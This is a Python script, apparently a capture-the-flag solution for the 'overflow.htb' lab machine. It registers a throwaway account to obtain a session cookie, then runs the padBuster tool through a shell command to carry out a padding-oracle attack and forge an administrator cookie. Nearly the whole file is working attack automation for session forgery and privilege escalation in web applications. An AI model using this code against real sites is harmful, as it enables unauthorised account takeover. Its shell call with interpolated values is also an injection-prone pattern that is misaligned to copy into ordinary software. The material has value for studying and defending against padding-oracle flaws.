#/usr/bin/python3

import requests
import urllib.parse
import subprocess

from common_tools import Colors
import settings


class Admin_cookie(object):
    """docstring for Admin_cookie"""

    def __init__(self, url_base="http://overflow.htb/"):
        self.url_base = url_base
        self.random_cookie = {}
        self.admin_cookie = {}

    def get_admin_cookie(self):
        return list(self.admin_cookie.items())[0]

    def get_random_cookie(self):
        return list(self.random_cookie.items())[0]

    def retrieve_random_cookie(self):
        """
            Connect a first time to the site to retrieve random cookie
        """
        registered_once = False
        headers = settings.generic_headers
        headers['Host'] = 'overflow.htb'
        headers['Origin'] = self.url_base

        print(Colors.begin_info+"Retrieving bad cookie from "+Colors.colorize(self.url_base, 'BLUE'))

        register_data = { 'username': 'exampl', 'password': 'exampl', 'password2': 'exampl' }

        print("Default credentials : ")
        for key, value in register_data.items():
            print(key, ' : ', value)

        while not self.random_cookie:
            if registered_once:
                print(Colors.begin_warning+"Cookie already taken :(. You must provide other credentials : ")
                register_data['username'] = input("username : ")
                register_data['password'] = input("password : ")
                register_data['password2'] = register_data['password']

            resp = requests.post(self.url_base+"register.php", data=register_data, headers=headers, allow_redirects=False)
            registered_once=True
            for header in resp.headers.keys():
                if "cookie" in header.lower():
                    cookie_key, cookie_val = resp.headers[header].split('=')
                    #dont forget to URL decode your cookie!
                    cookie_val = urllib.parse.unquote(cookie_val)
                    self.random_cookie[cookie_key] = cookie_val
        print(Colors.begin_success+"Retrieved random cookie : "+Colors.colorize(cookie_val, 'GREEN'))

    def crack_admin_cookie(self):
        """
            Given our random cookie, start to crack admin cookie because of oracle padding CVE
            Use Perl padBuster script for that
        """
        if not self.random_cookie:
            self.retrieve_random_cookie()

        cookie_key, cookie_val = self.get_random_cookie()

        print(Colors.colorize("Launching padBuster to retrieve admin cookie. This can take a while (about 2mins)... ", 'YELLOW'))
        command=f"/usr/bin/perl {settings.external_tools}padBuster.pl {self.url_base}home/index.php \"{cookie_val}\" 8 -cookies \"{cookie_key}={cookie_val}\" -plaintext username=admin"

        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, close_fds=True)
        #Tell to padBuster that url with error about cookie padding is the second one (../logout.php?err=1)
        output, errors = proc.communicate(input=b'2\n')

        lines = output.decode().splitlines()
        for line in lines:
            if "Encrypted value is" in line:
                self.admin_cookie[cookie_key] = line.split(':')[1].strip()
                print(Colors.begin_success+"Retrived admin cookie successfully : "+Colors.colorize(self.admin_cookie[cookie_key], 'GREEN'))
                return True
        return False


